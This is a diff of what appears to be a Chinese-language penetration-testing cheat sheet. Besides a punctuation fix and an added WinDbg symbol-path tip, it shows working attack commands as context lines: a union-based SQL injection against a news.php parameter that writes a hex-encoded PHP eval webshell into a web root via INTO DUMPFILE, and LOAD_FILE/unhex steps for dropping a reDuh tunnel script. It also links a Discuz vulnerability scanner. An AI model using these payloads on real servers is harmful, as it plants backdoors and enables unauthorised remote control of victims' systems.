@@ -836,7 +836,7 @@
    udf:http://www.cnblogs.com/qing123/p/4676808.html
    outfile和dumpfile区别:http://www.dedecms.com/knowledge/data-base/mysql/2012/0819/7569.html
    在phpmyadmin中
-   windows系统在phpmyadmin的web后台写文件时写成into dumpfile 'c:<span class="se">\w</span>ww<span class="se">\s</span>ome<span class="se">\1</span>.php'无法写入时，改成into dumpfie 'c:<span class="se">\\</span>www<span class="se">\\</span>some<span class="se">\\</span>1.php'
+   windows系统在phpmyadmin的web后台写文件时写成into dumpfile 'c:<span class="se">\w</span>ww<span class="se">\s</span>ome<span class="se">\1</span>.php'无法写入时,改成into dumpfie 'c:<span class="se">\\</span>www<span class="se">\\</span>some<span class="se">\\</span>1.php'
    SELECT HEX(LOAD_FILE(0x2f70687073747564792f7777772f72654475682e706870))INTO DUMPFILE　'/phpstudy/www/121.txt'    (/phpstudy/www/reDuh.php)  本地(linux)取hex值
    select unhex('...') into dumpfile 'c:/inetpub/wwwroot/memberinfo/....php';-- -成功,这样不会被转义,如果是outfile会被转义　远程dumpfile出去 (对方windows)
    同理写shell:bs/news.php?id=3 and 1=2 union select null,null,null,null,unhex('3C3F70687020406576616C28245F504F53545B27746F6D275D293B3F3E') into dumpfile 'C:/AAWServer/www/php/k82.php';
@@ -1167,6 +1167,9 @@
 <span class="p">170.</span>discuz漏洞扫描工具
     dzscan
     https://github.com/code-scan/dzscan
+<span class="p">171.</span>windbg中找不到symbol路径解决方法:
+    .sympath srv<span class="ge">*c:symbols*</span>http://msdl.microsoft.com/download/symbols
+    .reload /f
 </code></pre>
 </div>
 </span>
